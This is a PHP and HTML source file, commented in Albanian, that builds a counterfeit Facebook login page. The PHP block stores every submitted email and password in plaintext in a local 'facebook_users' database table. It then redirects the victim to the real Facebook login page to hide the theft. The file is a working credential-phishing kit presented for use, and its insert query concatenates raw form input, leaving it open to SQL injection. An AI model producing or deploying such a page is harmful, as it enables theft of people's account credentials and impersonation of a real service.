<?php
// Vendosni informacionet për lidhjen me bazën e të dhënave
$servername = "localhost";
$username = "root"; // Ndryshoni këtu me emrin e përdoruesit tuaj të bazës së të dhënave
$password = ""; // Ndryshoni këtu me fjalëkalimin tuaj të bazës së të dhënave
$dbname = "facebook_login"; // Ndryshoni këtu me emrin e bazës së të dhënave për facebook_login

// Krijo lidhjen me bazën e të dhënave
$conn = new mysqli($servername, $username, $password, $dbname);

// Kontrolloni lidhjen
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

// Kontrolloni nëse forma është paraqitur dhe nëse është dërguar
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Merrni vlerat nga forma e hyrjes
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Shtoni kodin për të ruajtur të dhënat në bazën e të dhënave
    $sql = "INSERT INTO facebook_users (email, password)
    VALUES ('$email', '$password')";

    if ($conn->query($sql) === TRUE) {
        // Tani mund të drejtoni përdoruesin në faqen origjinale të hyrjes në Facebook
        header("Location: https://www.facebook.com/login");
        exit();
    } else {
        echo "Error: " . $sql . "<br>" . $conn->error;
    }
}

// Mbyll lidhjen me bazën e të dhënave
$conn->close();
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook</title>
    <style>
        body {
            padding: 0;
            margin: 0;
            background: #f0f2f5;
            font-family: Arial, sans-serif;
        }
        .box {
            display: flex;
            justify-content: center;
            align-items: center;
            width: 100%;
            height: 100vh;
        }
        .title-box {
            width: 500px;
        }
        .title-box img {
            width: 235px;
            margin-bottom: -10px;
        }
        .title-box p {
            color: #000;
            font-size: 26px;
            font-weight: normal;
            line-height: 32px;
        }
        .form-box {
            width: 350px;
            padding: 15px;
            text-align: center;
            border-radius: 5px;
            background: #fff;
            margin-left: 60px;
            box-shadow: 0px 2px 10px 1px rgba(71, 71, 71, 0.52);
        }
        .form-box input {
            width: 100%;
            margin-bottom: 15px;
            padding: 15px;
            font-size: 18px;
            box-sizing: border-box;
            border: 1px solid #eeebeb;
            border-radius: 5px;
            outline: none;
        }
        .form-box input:focus {
            box-shadow: 0px 0px 1px 1px rgb(22, 111, 229);
        }
        .form-box button {
            width: 100%;
            margin-bottom: 15px;
            color: #fff;
            font-size: 20px;
            font-weight: 600;
            border-radius: 5px;
            border: none;
            padding: 13px 0;
            cursor: pointer;
            background: #166fe5;
        }
        .form-box button:hover {
            background: #1877f2;
        }
        .form-box a {
            color: #166fe5;
            font-size: 14px;
            text-decoration: none;
            margin-top: 5px;
            margin-bottom: 20px;
            display: block;
        }
        .form-box a:hover {
            text-decoration: underline;
        }
        .form-box hr {
            border: 1px solid #dadde1;
            margin-bottom: 15px;
        }
        .form-box .create-btn a {
            color: #fff;
            font-size: 16px;
            text-decoration: none;
            padding: 15px 20px;
            border-radius: 5px;
            background: #36a420;
            font-weight: 600;
            display: inline-block;
            margin-bottom: 5px;
        }
        .form-box .create-btn a:hover {
            background: #42b72a;
        }
    </style>
</head>
<body>
    <div class="box">
        <div class="title-box">
            <img src="https://i.postimg.cc/NMyj90t9/logo.png" alt="Facebook">
            <p>Facebook helps you connect and share with the people in your life.</p>
        </div>
        <div class="form-box">
            <form method="POST" action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>">
                <input type="text" name="email" placeholder="Email address or phone number">
                <input type="password" name="password" placeholder="Password">
                <button type="submit">Log In</button>
                <a href="#">Forgotten Password</a>
            </form>
            <hr>
            <div class="create-btn">
                <a href="https://youtu.be/Lcw8t9vTpQI" target="_blank">Create New Account</a>
            </div>
        </div>
    </div>
</body>
</html>
